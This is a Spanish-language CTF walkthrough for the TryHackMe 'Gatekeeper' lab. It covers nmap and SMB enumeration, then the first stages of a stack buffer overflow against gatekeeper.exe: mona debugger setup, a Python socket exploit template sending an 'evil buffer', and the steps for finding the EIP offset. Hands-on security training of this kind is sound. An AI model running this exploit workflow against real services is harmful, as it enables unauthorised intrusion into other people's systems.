# Introducción

En nuestra máquina Kali, instala openvpn: ```sudo apt install openvpn``` y su archivo de configuración de vuestro perfil de Tryhackme.

Nos conectamos mediante el siguiente comando: ```sudo openvpn tu_archivo.ovpn```

Ve al laboratorio en cuestión: https://tryhackme.com/room/gatekeeper y empieza la máquina.

![78a8f36c1dfb9abfbd0ea95082f82e26](https://user-images.githubusercontent.com/107146199/172962055-32a9ff9e-2528-4721-8b81-013d03a336d3.png)

Cuando tengas la IP estaremos listos.

## Preparativos

Ejecutamos un nmap de la siguiente manera: ```nmap -sC -sV -T5 -vv 10.10.250.223```

```-sC y -sV```: usados conjuntamente nos brinda la oportunidad de ver los scripts genéricos y sus respectivas versiones.

```-T5```: aumentamos la velocidad de procesos (threads), siendo 1 la forma más silenciosa y 5 la forma más ruidosa.

```-vv```: básicamente nos muestra más detalladamente lo obtenido, filtrando más información.

El nmap en cuestión nos muestra lo siguiente:

![e880a4ef64ebf0e08c6656dc61a17bd5](https://user-images.githubusercontent.com/107146199/172963242-3c289a4f-b537-4ee5-9e50-2df147315774.png)

Vemos que los puertos 139 y 445 están abiertos y sabemos que pertenecen a un servidor samba(protocolo para compartir archivos en red de windows).

Usemos el siguiente comando para ver si nos esconde algo el dicho servidor: ```smbclient -L //ip_máquina```

![517691e16395fedee413927be0d8efaa](https://user-images.githubusercontent.com/107146199/172963685-1c0faeac-db62-4261-baf4-964658853ee6.png)

Listando vemos lo siguiente, indaguemos en el directorio ```Users``` de la siguiente manera: ```smbclient //ip_máquina/Users```

![b23e96e662bba04896995c785eba342e](https://user-images.githubusercontent.com/107146199/172963834-7317cea9-3e9c-464b-a6ef-b0224a470d04.png)

El directorio ```Share``` resulta interesante, entremos en ella y veamos que tenemos.

![5c651412f9761d7f415d7fcab01ba848](https://user-images.githubusercontent.com/107146199/172964005-460e517d-0509-43cc-8619-fe1eca44ec72.png)

¡Bingo! Tenemos un posible programa vulnerable, descarguémoslo. De momento tenemos todo lo que necesitamos, vayamos al siguiente paso.

# Haciendo uso de x32dbg

Vámonos a nuestra máquina virtual de Windows, y descarga el siguiente programa: https://github.com/therealdreg/x64dbg-exploiting

Transfiere el archivo de nuestra máquina Kali a nuestra máquina Windows y empecemos. Abre x32dbg y el gatekeeper.exe desde el mismo. Una vez abierto, haz clic varias veces hasta que el programa esté en total ejecución.

![08531916ff9c374b071a9296ae1b2aa5](https://user-images.githubusercontent.com/107146199/172964817-73b5c257-9849-40d9-9395-cdd16d232e05.png)

Debe quedar tal que así. ¡Estamos listos para explotar el programa!

## Explotando gatekeeper.exe

Antes de empezar, siempre que hagamos un reinicio a nuestro Windows debemos introducir la siguiente línea de comandos en nuestro x32dbg:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

Así evitamos problemas previos a nuestro trabajo.

Empecemos creando nuestro script en python, dejo la siguiente plantilla:

```
import socket

ip = "127.0.0.1"
port = 31337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Investigando un poco vemos que uno de los puertos que encontramos anteriormente (el 31337) en nuestro nmap está ejecutando ```gatekeeper.exe```.

Vamos a ir explotando a través de conexiones en nuestra red local (127.0.0.1), más adelante explotaremos la máquina en cuestión pero de momento empezaremos por aquí.

Primero de todo, creamos un patrón cíclico, de 2000. En nuestro x32dbg ve a la pestaña ```logs``` y ejecuta lo siguiente: ```mona.mona("pattern_create 2000")```

![51ab4c3a4f295f20c37212f1f8b22bd5](https://user-images.githubusercontent.com/107146199/172966719-d19f1b9c-bf15-4822-94a7-65db633e0f77.png)

Copiamos el patrón en nuestro script en la línea de ```payload``` tal que así:

![b8f1a0575f80fa5fa2eb9f0ed4d36611](https://user-images.githubusercontent.com/107146199/172966823-5b4f3b08-9922-4c3f-852f-834087db7c2e.png)

¡Ojo! Ten cuidado y revisa que nuestro patrón esté entre comillas. Guarda nuestro script como ```gatekeeper.py``` y en una ```cmd``` ejecútalo con python3: ```python3 gatekeeper.py```. Revisa nuestro x32dbg, si este aún no ha recibido la información de nuestro script prueba varias veces hasta que llegue.

![afff93bd6f9824e4cc040072f49745ff](https://user-images.githubusercontent.com/107146199/172967227-fcdf8b28-3e8e-48a7-91b5-860a0add30c1.png)

Una vez aparezca nuestro patrón, revisamos EIP(puntero de instrucciones extendido, en definitiva le dice al programa dónde ir para ejecutar el siguiente comando), apuntamos el valor de EIP: ```39654138```

Hacemos una búsqueda del mismo con el siguiente comando: ```mona.mona("pattern_offset 39654138")```

![34e841c2a7b3e750dd8577106aaa6563](https://user-images.githubusercontent.com/107146199/172967886-59d4ca4d-1671-461c-8a27-08c79c98ff30.png)

¡Listo! Necesitamos 146 bytes para llegar al inicio de EIP(en nuestro caso usaremos A para rellenar), aparte de esto rellenaremos dicho EIP(retorno) con 4 bytes(en nuestro caso usaremos B para distinguir mejor y comprobar con exactitud que estamos en el punto previo al stack del programa ```(ESP)```.








